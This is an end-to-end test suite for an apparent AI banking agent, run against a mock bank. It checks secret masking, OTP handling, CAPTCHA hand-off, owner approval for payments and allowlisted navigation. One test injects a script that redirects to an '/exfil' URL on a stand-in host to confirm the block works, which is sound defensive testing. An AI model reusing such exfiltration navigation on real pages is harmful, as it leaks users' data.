"""End to end: real Google Chrome, real persistent profiles, the full job runner, against
the local mock bank. The model is the generic HeuristicLLM test double (no API calls).

Run with: uv run pytest -m chrome tests/test_e2e_mockbank.py
"""

from __future__ import annotations

import asyncio
import json

import httpx
import pytest

from friday.agent.loop import AgentLoop, AgentTask
from friday.agent.recorder import PageRecorder
from friday.config import Settings
from friday.context import build_context
from friday.mock_site import MOCK_TOTP_SEED, PASSWORD, USERNAME
from friday.otp.extract import extract_otp
from friday.profiles.models import Site
from friday.vault.masking import Redactor

from .conftest import TEST_KEY
from .fakes import HeuristicLLM, MockBankServer

pytestmark = [pytest.mark.chrome, pytest.mark.timeout(240)]


@pytest.fixture(scope="module")
def bank():
    with MockBankServer() as server:
        yield server


@pytest.fixture
def ectx(tmp_path):
    llm = HeuristicLLM(dates=("2026-03-01", "2026-03-31"))
    s = Settings(
        _env_file=None, data_dir=tmp_path / "data", volume_encrypted_assert=True, display_backend="auto",
        action_delay_ms=(0, 0), site_min_login_interval_seconds=0, otp_timeout_seconds=20,
        public_base_url="http://testserver", geoip_url=None,
    )  # fmt: skip
    ctx = build_context(s, master_key=TEST_KEY, redactor=Redactor(), llm_factory=lambda: HeuristicLLM(dates=("2026-03-01", "2026-03-31")), chat_llm_factory=False)
    ctx.test_llm = llm
    yield ctx
    ctx.db.close()


def setup_scenario(ctx, bank, sc: str, account: str = "alice") -> str:
    site_id = f"mock-{sc.replace('_', '-')}"
    ctx.sites.upsert(Site(id=site_id, name=f"MockBank {sc}", login_url=bank.url(f"/s/{sc}/login"), domains=["localhost"]))
    p = ctx.profiles.create(site_id, account)
    ctx.vault.put(f"{site_id}/{account}/username", USERNAME)
    ctx.vault.put(f"{site_id}/{account}/password", PASSWORD)
    return p.id


async def run(ctx, kind: str, profile_id: str, params=None) -> dict:
    run_id = ctx.jobs.submit(kind, profile_id, params or {}, force=True)
    await ctx.jobs.wait_idle()
    return ctx.runs.get(run_id)


def states(ctx, run_id: str) -> list[str]:
    return [s["state"] for s in ctx.runs.steps(run_id) if s["kind"] == "state"]


def assert_no_secret_leaks(ctx):
    blob = json.dumps([ctx.runs.steps(r["id"]) for r in ctx.runs.list()]) + repr(ctx.audit.list(limit=5000))
    assert PASSWORD not in blob
    assert ctx.audit.verify_chain()


async def test_normal_login_then_session_reuse(ectx, bank):
    pid = setup_scenario(ectx, bank, "normal")
    r = await run(ectx, "login", pid)
    assert r["status"] == "succeeded", r
    assert "LOGGED_IN" in states(ectx, r["id"])
    steps = ectx.runs.steps(r["id"])
    assert any("(filled)" in (s["result"] or "") for s in steps if s["tool"] == "read_page"), "password value must be masked in snapshots"
    assert any(s["screenshot_file_id"] for s in steps)
    assert ectx.profiles.get(pid).status == "logged_in"
    # Second run: cookies persisted in the profile, so no new login.
    r2 = await run(ectx, "login", pid)
    assert r2["status"] == "succeeded" and r2["result"]["reused_session"] is True
    notes = ectx.sitenotes.render("mock-normal")
    assert "Customer ID and password" in notes
    assert_no_secret_leaks(ectx)


async def test_email_otp_via_gmail(ectx, bank):
    pid = setup_scenario(ectx, bank, "email_otp")

    class FakeGmail:
        configured = True

        async def wait_for_code(self, *, senders, since, timeout, fallback_terms=None):
            async with httpx.AsyncClient() as http:
                for _ in range(20):
                    box = (await http.get(bank.url("/mock/outbox"))).json()
                    mail = [m for m in box if m["channel"] == "email"]
                    if mail:
                        return extract_otp(mail[-1]["body"])
                    await asyncio.sleep(0.2)
            return None

    ectx.broker.gmail = FakeGmail()
    r = await run(ectx, "login", pid)
    assert r["status"] == "succeeded", r
    assert "NEEDS_OTP_EMAIL" in states(ectx, r["id"])
    assert ectx.audit.list(action_prefix="otp.obtained")[0].details["via"] == "gmail"
    code = extract_otp((httpx.get(bank.url("/mock/outbox")).json())[-1]["body"])
    assert code not in json.dumps(ectx.runs.steps(r["id"])), "OTP must never be logged"


async def test_sms_otp_via_owner_reply(ectx, bank):
    pid = setup_scenario(ectx, bank, "sms_otp")

    async def owner():
        while not ectx.broker.pending():
            await asyncio.sleep(0.1)
        async with httpx.AsyncClient() as http:
            sms = [m for m in (await http.get(bank.url("/mock/outbox"))).json() if m["channel"] == "sms"][-1]
        assert await ectx.broker.handle_reply(sms["body"], "telegram")

    t = asyncio.create_task(owner())
    r = await run(ectx, "login", pid)
    await t
    assert r["status"] == "succeeded", r
    assert "NEEDS_OTP_SMS" in states(ectx, r["id"])
    assert any("Enter the SMS code" in m[0] for m in ectx.notifier.notifiers[0].sent)


async def test_totp(ectx, bank):
    pid = setup_scenario(ectx, bank, "totp")
    ectx.vault.put("mock-totp/alice/totp-seed", MOCK_TOTP_SEED)
    r = await run(ectx, "login", pid)
    assert r["status"] == "succeeded", r
    assert "NEEDS_TOTP" in states(ectx, r["id"])


async def test_push_approval_waits_for_page(ectx, bank):
    pid = setup_scenario(ectx, bank, "push")
    r = await run(ectx, "login", pid)
    assert r["status"] == "succeeded", r
    assert "NEEDS_APPROVAL_IN_APP" in states(ectx, r["id"])


async def test_wrong_password_retried_once_then_stops(ectx, bank):
    pid = setup_scenario(ectx, bank, "normal", account="bob")
    ectx.vault.put("mock-normal/bob/password", "not-the-password")
    r = await run(ectx, "login", pid)
    assert r["status"] == "needs_attention"
    st = states(ectx, r["id"])
    assert st.count("CREDENTIALS_REJECTED") == 2, st
    assert sum(1 for s in ectx.runs.steps(r["id"]) if s["tool"] == "click" and "Sign in" in (s["result"] or "")) == 2


async def test_silent_bounce_triggers_diagnosis_and_probes(ectx, bank):
    pid = setup_scenario(ectx, bank, "bounce")
    r = await run(ectx, "login", pid)
    assert r["status"] == "needs_attention"
    assert "SILENT_BOUNCE" in states(ectx, r["id"])
    rid = r["result"]["diagnosis_report"]
    report = ectx.diagnoser.get(rid)
    assert report["capture"]["final_url"].endswith("/s/bounce/login")
    assert report["fingerprint"]["userAgent"]
    assert report["causes"] and all("score" in c for c in report["causes"])
    names = {e["name"]: e for e in report["experiments"]}
    assert names["baseline"]["status"] == "done" and names["baseline"]["result_state"] == "LOGIN_FORM"
    assert names["headless"]["status"] == "done"
    assert names["fresh"]["status"] == "done"
    assert names["no_proxy"]["status"] == "skipped"
    assert report["next_experiment"]


async def test_access_denied_stops_before_credentials(ectx, bank):
    pid = setup_scenario(ectx, bank, "denied")
    r = await run(ectx, "login", pid)
    assert r["status"] == "needs_attention"
    assert r["result"]["login_state"] == "ACCESS_DENIED_OR_BLOCKED"
    assert not ectx.audit.list(action_prefix="secret.use"), "no credentials typed into a blocked page"
    assert r["result"]["diagnosis_report"]


async def test_captcha_hands_off_and_never_solves(ectx, bank):
    pid = setup_scenario(ectx, bank, "captcha")

    async def owner_cancels():
        while not ectx.handoffs.list_open():
            await asyncio.sleep(0.1)
        ectx.handoffs.cancel(ectx.handoffs.list_open()[0].id)

    t = asyncio.create_task(owner_cancels())
    r = await run(ectx, "login", pid)
    await t
    assert r["status"] == "needs_attention"
    assert "CAPTCHA" in states(ectx, r["id"])
    assert any(s["kind"] == "handoff" for s in ectx.runs.steps(r["id"]))


async def test_fetch_statement_csv_verified_and_deduped(ectx, bank):
    pid = setup_scenario(ectx, bank, "normal", account="stmt")
    r = await run(ectx, "fetch_statement", pid, {"start": "2026-03-01", "end": "2026-03-31"})
    assert r["status"] == "succeeded", r
    res = r["result"]
    assert res["verification"]["ok"] and res["verification"]["balance_continuity"] == 1.0
    n = res["verification"]["count"]
    assert res["stored"] == {"new": n, "duplicates": 0}
    f = res["files"][0]
    raw = (ectx.files.root / f["file_id"]).read_bytes()
    assert b"Narration" not in raw and b"Narration" in ectx.files.read(f["file_id"])  # encrypted at rest
    r2 = await run(ectx, "fetch_statement", pid, {"start": "2026-03-01", "end": "2026-03-31"})
    assert r2["result"]["stored"] == {"new": 0, "duplicates": n}
    assert "statement_path" in ectx.sitenotes.render("mock-normal")


async def test_payment_requires_owner_approval(ectx, bank):
    pid = setup_scenario(ectx, bank, "normal", account="pay")
    assert (await run(ectx, "login", pid))["status"] == "succeeded"

    asked = []

    async def owner_denies():
        while True:  # deny everything; assertions happen afterwards so a surprise cannot hang the test
            for a in ectx.gate.pending():
                asked.append(a)
                ectx.gate.decide(a.id, approve=False)
            await asyncio.sleep(0.05)

    run_id = ectx.runs.create("manual", pid, {})
    async with ectx.profiles.open(pid, purpose="test") as op:
        page = await op.session.page()
        await page.goto(bank.url("/s/normal/home"))
        ex = ectx.jobs._executor(op, page, run_id, ectx.test_llm)
        rec = PageRecorder(ectx.redactor)
        rec.attach(op.session.context)
        t = asyncio.create_task(owner_denies())
        out = await AgentLoop(HeuristicLLM(), ex, ectx.runs).run(
            AgentTask(goal="Transfer 500 to account 999.", run_id=run_id, profile_id=pid, site_name="MockBank",
                      allowed_domains=("localhost",), secret_names=[])  # fmt: skip
        )
        t.cancel()
    assert [a.action for a in asked] and all("Pay now" in a.action for a in asked), [a.action for a in asked]
    assert asked[0].details["screenshot_file_id"]
    assert out.status == "blocked"
    assert httpx.get(bank.url("/mock/transfers")).json() == []
    assert ectx.audit.list(action_prefix="approval.denied")


async def test_navigation_outside_allowlist_is_blocked(ectx, bank):
    pid = setup_scenario(ectx, bank, "normal", account="nav")
    run_id = ectx.runs.create("manual", pid, {})
    async with ectx.profiles.open(pid, purpose="test") as op:
        page = await op.session.page()
        ex = ectx.jobs._executor(op, page, run_id, ectx.test_llm)
        await ex.start()
        denied = await ex.run("goto", {"url": "https://example.com/"})
        assert denied.is_error and "allowlist" in denied.text()
        # A page-initiated navigation (not via the tool) is stopped at the network layer.
        await page.goto(bank.url("/s/normal/login"))
        await page.evaluate("location.href = 'http://127.0.0.1:9/exfil?x=1'")
        await asyncio.sleep(1)
        assert ex.blocked_navigations and "exfil" in ex.blocked_navigations[0]
        assert "127.0.0.1:9" not in page.url  # the request never left; Chrome shows its error page instead


async def test_login_on_a_page_that_disables_eval(ectx, bank):
    """Some banks (Amex) replace window.eval; friday's page reads must not depend on it."""
    pid = setup_scenario(ectx, bank, "hardened")
    r = await run(ectx, "login", pid)
    assert r["status"] == "succeeded", r
    assert "LOGIN_FORM" in states(ectx, r["id"]) and "PAGE_FAILED" not in states(ectx, r["id"])


async def test_login_submitted_by_script_waits_for_the_spinner(ectx, bank):
    """Amex sends the form by XHR and spins for seconds with no navigation. Classifying the page
    while the button still spins saw the same login form and called it a SILENT_BOUNCE."""
    pid = setup_scenario(ectx, bank, "xhr")
    r = await run(ectx, "login", pid)
    st = states(ectx, r["id"])
    assert r["status"] == "succeeded", (r, st)
    assert "SILENT_BOUNCE" not in st and "LOGGED_IN" in st
    click = next(s for s in ectx.runs.steps(r["id"]) if s["tool"] == "click" and "Sign in" in (s["result"] or ""))
    assert "Waited" in click["result"] and "Page is now" in click["result"], click["result"]


async def test_bounce_verdict_is_rechecked_before_stopping(ectx, bank, monkeypatch):
    """Even if the submit wait gives up early, a page that redirects a moment later is not a bounce."""
    import friday.agent.tools as tools
    import friday.mock_site as mock_site

    monkeypatch.setattr(tools, "SUBMIT_WAIT_SECONDS", 0.0)
    monkeypatch.setattr(mock_site, "XHR_LOGIN_DELAY", 1.5)  # well inside the engine's 4 s re-check
    pid = setup_scenario(ectx, bank, "xhr", account="late")
    r = await run(ectx, "login", pid)
    st = states(ectx, r["id"])
    assert r["status"] == "succeeded", (r, st)
    assert "SILENT_BOUNCE" not in st
